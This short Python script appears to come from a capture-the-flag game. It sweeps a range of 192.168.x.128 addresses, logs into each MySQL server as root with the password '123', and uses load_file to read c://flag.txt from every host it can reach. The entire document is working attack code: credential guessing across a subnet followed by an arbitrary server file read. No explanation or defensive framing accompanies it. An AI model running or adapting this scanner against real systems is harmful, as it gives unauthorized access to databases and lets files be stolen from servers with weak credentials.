import MySQLdb
for i in range(70,255):
    try:
        ip="192.168."+str(i)+".128"
        conn=MySQLdb.connect(host=ip,user='root',passwd='123',connect_timeout=10)
        cursor=conn.cursor()
        sql='select load_file("c://flag.txt")'
        try:
            cursor.execute(sql)
            result=cursor.fetchall()
            print(ip+"\n")
            print(result)
            conn.close()
        except:
            print(ip+"exec down")

    except:
        print(ip+"conn down")

